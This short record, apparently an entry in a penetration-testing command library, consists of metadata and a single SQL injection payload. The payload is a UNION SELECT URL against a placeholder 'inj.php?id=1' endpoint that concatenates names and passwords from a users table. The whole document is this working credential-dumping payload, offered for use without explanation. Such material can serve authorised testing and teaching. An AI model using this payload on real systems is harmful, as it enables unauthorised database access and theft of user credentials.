---
id: 8316d8b7-2756-4dbf-ab73-4bd62b7a6b62
name: concat user names and passwords (0x3a represents “:”)
type: command
executor: bash
data: 'http://target-ip/inj.php?id=1 union all select 1,2,3,concat(name, 0x3A , password),5
  from users

  '
output: null
created_at: '2020-07-14T18:14:46.799821+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# concat user names and passwords (0x3a represents “:”)

```bash
http://target-ip/inj.php?id=1 union all select 1,2,3,concat(name, 0x3A , password),5 from users

```
